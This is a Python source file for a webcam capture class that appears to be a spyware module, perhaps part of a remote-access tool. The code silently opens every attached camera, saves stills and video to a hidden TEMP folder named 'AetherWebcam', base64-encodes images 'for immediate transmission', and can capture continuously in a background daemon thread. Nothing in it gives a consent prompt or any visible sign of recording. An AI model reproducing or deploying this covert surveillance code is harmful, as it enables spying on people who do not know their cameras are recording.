import cv2, os, time, threading, queue, base64, json
from datetime import datetime
import numpy as np

class WebcamCapturer:
    def __init__(self):
        self.capturing = False
        self.capture_thread = None
        self.frame_queue = queue.Queue(maxsize=10)
        self.output_dir = os.path.join(os.environ['TEMP'], 'AetherWebcam')
        os.makedirs(self.output_dir, exist_ok=True)
        self.camera_index = 0
        self.max_cameras_to_check = 4
        
    def list_cameras(self):
        """Detect available webcams."""
        available = []
        for i in range(self.max_cameras_to_check):
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
            if cap.isOpened():
                available.append(i)
                cap.release()
        return available
    
    def capture(self, duration=5, quality=85):
        """Capture webcam image or video."""
        cameras = self.list_cameras()
        if not cameras:
            return {"error": "No webcams found"}
        
        results = {}
        
        for cam_index in cameras:
            try:
                cap = cv2.VideoCapture(cam_index, cv2.CAP_DSHOW)
                
                if not cap.isOpened():
                    results[cam_index] = {"error": "Could not open camera"}
                    continue
                
                # Set resolution
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                
                # Capture single frame
                ret, frame = cap.read()
                
                if ret:
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"webcam_{cam_index}_{timestamp}.jpg"
                    filepath = os.path.join(self.output_dir, filename)
                    
                    # Encode as JPEG with specified quality
                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
                    _, buffer = cv2.imencode('.jpg', frame, encode_param)
                    
                    # Save to file
                    with open(filepath, 'wb') as f:
                        f.write(buffer)
                    
                    # Also get as base64 for immediate transmission
                    img_base64 = base64.b64encode(buffer).decode('utf-8')
                    
                    # Get camera properties
                    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                    fps = cap.get(cv2.CAP_PROP_FPS)
                    
                    results[cam_index] = {
                        "success": True,
                        "filename": filename,
                        "path": filepath,
                        "base64_preview": img_base64[:1000] + "..." if len(img_base64) > 1000 else img_base64,
                        "resolution": f"{width}x{height}",
                        "fps": fps,
                        "timestamp": timestamp
                    }
                    
                    # If duration > 0, capture video
                    if duration > 0:
                        video_result = self.capture_video(cap, cam_index, duration)
                        results[cam_index]['video'] = video_result
                
                cap.release()
                
            except Exception as e:
                results[cam_index] = {"error": str(e)}
        
        return results
    
    def capture_video(self, cap, cam_index, duration):
        """Capture video from webcam."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        video_filename = f"webcam_{cam_index}_{timestamp}.avi"
        video_path = os.path.join(self.output_dir, video_filename)
        
        # Define codec and create VideoWriter
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        fps = 20.0
        frame_size = (int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), 
                     int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)))
        
        out = cv2.VideoWriter(video_path, fourcc, fps, frame_size)
        
        start_time = time.time()
        frames_captured = 0
        
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
                frames_captured += 1
            else:
                break
        
        out.release()
        
        # Compress video
        compressed_path = self.compress_video(video_path)
        
        return {
            "filename": os.path.basename(compressed_path),
            "path": compressed_path,
            "duration": duration,
            "frames": frames_captured,
            "fps": frames_captured / duration if duration > 0 else 0
        }
    
    def compress_video(self, input_path):
        """Compress video using FFmpeg if available."""
        output_path = input_path.replace('.avi', '_compressed.mp4')
        
        try:
            # Check if ffmpeg is available
            import subprocess
            ffmpeg_cmd = [
                'ffmpeg', '-i', input_path,
                '-vcodec', 'libx264',
                '-crf', '28',
                '-preset', 'fast',
                '-acodec', 'aac',
                '-b:a', '128k',
                output_path,
                '-y'  # Overwrite output
            ]
            
            subprocess.run(ffmpeg_cmd, capture_output=True, timeout=30)
            
            # Remove original if compression succeeded
            if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
                os.remove(input_path)
                return output_path
        
        except:
            pass
        
        return input_path  # Return original if compression failed
    
    def start_continuous_capture(self, interval=60):
        """Start continuous webcam capture in background."""
        if self.capturing:
            return "Already capturing"
        
        self.capturing = True
        self.capture_thread = threading.Thread(
            target=self._continuous_capture_loop,
            args=(interval,),
            daemon=True
        )
        self.capture_thread.start()
        
        return f"Continuous capture started (interval: {interval}s)"
    
    def _continuous_capture_loop(self, interval):
        """Background loop for continuous capture."""
        while self.capturing:
            try:
                self.capture(duration=0, quality=70)  # Single frame
                time.sleep(interval)
            except:
                time.sleep(10)  # Wait longer on error
    
    def stop_continuous_capture(self):
        """Stop continuous capture."""
        self.capturing = False
        if self.capture_thread:
            self.capture_thread.join(timeout=5)
        
        return "Continuous capture stopped"
    
    def get_latest_captures(self, limit=10):
        """Get list of latest captures."""
        captures = []
        
        try:
            files = os.listdir(self.output_dir)
            image_files = [f for f in files if f.endswith(('.jpg', '.png', '.mp4', '.avi'))]
            image_files.sort(key=lambda x: os.path.getmtime(os.path.join(self.output_dir, x)), reverse=True)
            
            for filename in image_files[:limit]:
                filepath = os.path.join(self.output_dir, filename)
                stat = os.stat(filepath)
                
                captures.append({
                    'filename': filename,
                    'path': filepath,
                    'size': stat.st_size,
                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    'type': 'image' if filename.endswith(('.jpg', '.png')) else 'video'
                })
        
        except:
            pass
        
        return captures